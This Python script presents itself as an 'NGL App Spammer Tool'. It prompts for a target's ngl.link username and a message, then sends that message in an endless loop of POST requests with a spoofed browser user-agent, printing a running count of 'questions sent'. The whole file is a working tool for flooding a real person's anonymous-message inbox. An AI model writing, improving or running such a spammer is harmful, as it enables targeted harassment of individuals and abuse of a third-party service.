import os

try:
    import requests
    from colorama import init, Fore
except ModuleNotFoundError:
    os.system('pip3 install requests')
    import requests
    os.system('pip3 install colorama')
    from colorama import init, Fore
    

init(autoreset=False)
os.system("cls")

r = requests.Session()
print(f"{Fore.LIGHTCYAN_EX}NGL App Spammer Tool, Use it on your own risk...")
# Target is the visible username for the target, not the full link.
target = input(f"{Fore.RED}Enter {Fore.RED}Target: {Fore.WHITE}")
question = input(f"{Fore.RED}Enter {Fore.RED}Your Message: {Fore.WHITE}")
start = input(f"{Fore.WHITE}Start the {Fore.WHITE}Attack? Y/N: {Fore.WHITE}").upper()
def spam():
    questions_count = 0
    url = f"https://ngl.link/{target}"
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
    }

    payload = {
        "question": question
    }
    while True:
        spam = r.post(url, headers=headers, data=payload)
        questions_count += 1
        print(f"{Fore.WHITE}{questions_count} {Fore.WHITE}Questions Sent to: {Fore.RED}{target}")
        
if start == "Y":
    spam()
else:
    print("Failed to start.")
    exit()
